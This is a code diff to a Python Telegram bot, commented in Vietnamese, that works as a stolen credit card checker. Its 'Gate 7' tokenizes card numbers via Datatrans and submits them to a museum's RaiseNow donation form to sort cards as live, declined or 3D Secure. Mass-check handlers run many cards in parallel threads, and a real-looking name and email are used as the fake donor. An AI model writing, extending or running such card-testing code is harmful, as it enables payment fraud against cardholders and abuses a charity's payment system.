@@ -799,9 +799,9 @@ def _check_card_gate6(session, line, cc, mes, ano, cvv, bin_info, ua, cancellati
         return 'error', line, f"Lỗi hệ thống Gate 6: {e}", bin_info
 
 def _check_card_gate7(session, line, cc, mes, ano, cvv, bin_info, ua, cancellation_event, custom_charge_amount=None):
-    """Logic cho Gate 7 - Check Live"""
+    """Logic cho Gate 7 - Check Live (không charge, không custom) theo KEYCHECK."""
     try:
-        # Step 1: Tokenize card (Similar to Gate 5)
+        # Step 1: Tokenize card
         tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
         tokenize_payload = {
             "mode": "TOKENIZE", "formId": "250802162822879268", "cardNumber": cc,
@@ -829,17 +829,17 @@ def _check_card_gate7(session, line, cc, mes, ano, cvv, bin_info, ua, cancellati
                 return 'decline', line, 'INVALID_CARDNUMBER_DECLINE', bin_info
             transaction_id = token_data.get("transactionId")
             if not transaction_id:
-                return 'decline', line, token_data.get("error", {}).get("message", "Unknown error"), bin_info
+                return 'decline', line, token_data.get("error", {}).get("message", "Unknown error at Tokenize"), bin_info
         except json.JSONDecodeError:
             if token_response.status_code != 200:
                 return 'error', line, f"Lỗi HTTP {token_response.status_code} khi Tokenize", bin_info
             return 'error', line, "Phản hồi Tokenize không phải JSON", bin_info
 
-        # Step 2: Make payment source request
+        # Step 2: Make payment source request (non-charging check)
         payment_url = "https://api.raisenow.io/payment-sources"
         payment_payload = {
             "account_uuid": "ed99e982-2f16-4643-be9d-9b31a66c3edf", "test_mode": False,
-            "create_supporter": False, "amount": {"currency": "CHF", "value": 50},
+            "create_supporter": False, "amount": {"currency": "CHF", "value": 50}, # This is likely a validation amount
             "supporter": {"locale": "de", "first_name": "Minh", "last_name": "Nhat", "email": "minhnhat4417@gmail.com", "email_permission": False, "raisenow_parameters": {"integration": {"opt_in": {"email": False}}}},
             "raisenow_parameters": {"analytics": {"channel": "paylink", "preselected_amount": "5000", "suggested_amounts": "[5000,12500,25000]", "user_agent": ua}, "solution": {"uuid": "09f67512-414e-4a70-ac58-08b999c47007", "name": "Spendenformular Blindenmuseum", "type": "donate"}, "product": {"name": "tamaro", "source_url": "https://donate.raisenow.io/dbhrx?lng=de", "uuid": "self-service", "version": "2.16.0"}, "integration": {"donation_receipt_requested": "false"}},
             "custom_parameters": {"campaign_id": "", "campaign_subid": ""},
@@ -854,19 +854,27 @@ def _check_card_gate7(session, line, cc, mes, ano, cvv, bin_info, ua, cancellati
 
         payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
         if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Lỗi Payment Source: {error}", bin_info
+        if not payment_response: return 'error', line, "Lỗi HTTP không có phản hồi khi Payment Source", bin_info
 
         response_text = payment_response.text
+
+        # --- LOGIC MỚI DỰA TRÊN KEYCHECK ---
 
         if '{"message":"Forbidden"}' in response_text:
             return 'gate_dead', line, 'GATE_DIED: Forbidden', bin_info
 
-        # Specific check for Gate 7 success
+        # KEYCHAIN Success: Card is Live (Approved). Sẽ không trả về 'custom'.
         if '"3d_secure_2"' in response_text:
-            return 'live_success', line, 'Card added successfully', bin_info
+            return 'live_success', line, 'Card is Live (Approved)', bin_info
+
+        # KEYCHAIN Failure: Card is Declined.
         elif '"payment_status":"failed"' in response_text or '"payment_source_status":"failed"' in response_text:
             return 'decline', line, response_text, bin_info
+
+        # Response không khớp key nào -> Gửi cho Admin để review.
         else:
             return 'unknown', line, response_text, bin_info
+
     except Exception as e:
         logger.error(f"Lỗi không xác định trong Gate 7 cho line '{line}': {e}", exc_info=True)
         return 'error', line, f"Lỗi hệ thống Gate 7: {e}", bin_info
@@ -1344,7 +1352,7 @@ async def _process_single_check(update, context, line, custom_charge_amount=None
         else:
             status_map = {
                 'success': ("✅ CHARGED", "Transaction successful!"),
-                'live_success': ("✅ Approved", "Card added"),
+                'live_success': ("✅ Approved", "Card is Live"),
                 'decline': ("❌ DECLINED", "Transaction declined by issuing bank."),
                 'custom': ("🔒 3D SECURE", "3D Secure authentication required."),
                 'invalid_format': ("📋 FORMAT ERROR", full_response),
@@ -1543,7 +1551,7 @@ async def multi_check_command(update, context):
                         elif full_response == 'INVALID_CARDNUMBER_DECLINE': result_line = f"{status_icons['decline']} `{original_line}` | `DECLINED (Invalid Card Number)`"
                         else: result_line = f"{status_icons['decline']} `{original_line}`"
                     elif status == 'live_success':
-                        result_line = f"✅ `{original_line}` | Approved (Card Added)"
+                        result_line = f"✅ `{original_line}` | Approved (Live)"
                     elif status == 'invalid_format': result_line = f"{status_icons[status]} `{original_line}` | Lý do: {str(full_response)[:50]}" 
                     elif status == 'cancelled': continue
                     else:
@@ -1751,7 +1759,7 @@ async def mass_check_handler(update, context):
                         elif full_response == 'INVALID_CARDNUMBER_DECLINE': line_to_save = f"{original_line} | DECLINED (Invalid Card Number)"
                         else: line_to_save = f"{original_line} | DECLINED"
                     elif status == 'live_success':
-                        line_to_save = f"{original_line} | APPROVED (Card Added)"
+                        line_to_save = f"{original_line} | APPROVED (Live)"
                     elif status == 'invalid_format': line_to_save = f"{original_line} | Reason: {full_response}"
                     elif status == 'cancelled': continue
                     else:
@@ -1774,14 +1782,14 @@ async def mass_check_handler(update, context):
                 if time.time() - last_update_time > 2.0 or processed_count == total_lines:
                     progress_bar = create_progress_bar(processed_count, total_lines, length=20)
                     status_text = (f"**🚀 Checking in progress...**\n{progress_bar}\n"
-                                     f"**Gate:** `{gate_name}` | **Threads:** `{num_threads}`\n"
-                                     f"**Progress:** `{processed_count}/{total_lines}`\n\n"
-                                     f"✅ **Charged:** `{counts['success']}`\n"
-                                     f"✅ **Approved (Live):** `{counts['live_success']}`\n"
-                                     f"❌ **Declined:** `{counts['decline']}`\n"
-                                     f"🔒 **3D Secure:** `{counts['custom']}`\n"
-                                     f"📋 **Invalid Format:** `{counts['invalid_format']}`\n"
-                                     f"❔ **Errors:** `{counts['error']}`")
+                                   f"**Gate:** `{gate_name}` | **Threads:** `{num_threads}`\n"
+                                   f"**Progress:** `{processed_count}/{total_lines}`\n\n"
+                                   f"✅ **Charged:** `{counts['success']}`\n"
+                                   f"✅ **Approved (Live):** `{counts['live_success']}`\n"
+                                   f"❌ **Declined:** `{counts['decline']}`\n"
+                                   f"🔒 **3D Secure:** `{counts['custom']}`\n"
+                                   f"📋 **Invalid Format:** `{counts['invalid_format']}`\n"
+                                   f"❔ **Errors:** `{counts['error']}`")
                     try: 
                         current_reply_markup = reply_markup if not cancel_event.is_set() else None
                         await status_message.edit_text(text=status_text, reply_markup=current_reply_markup)
@@ -1866,7 +1874,7 @@ async def stop_command(update, context):
         except (ValueError, IndexError):
             await update.message.reply_text("❌ User ID không hợp lệ. Cú pháp: `/stop <user_id>`"); return
     elif user.id != ADMIN_ID and user.id not in load_users():
-       await update.message.reply_text("Bạn không có quyền dùng lệnh này."); return
+      await update.message.reply_text("Bạn không có quyền dùng lệnh này."); return
 
     if target_user_id in CANCELLATION_EVENTS:
         CANCELLATION_EVENTS[target_user_id].set()
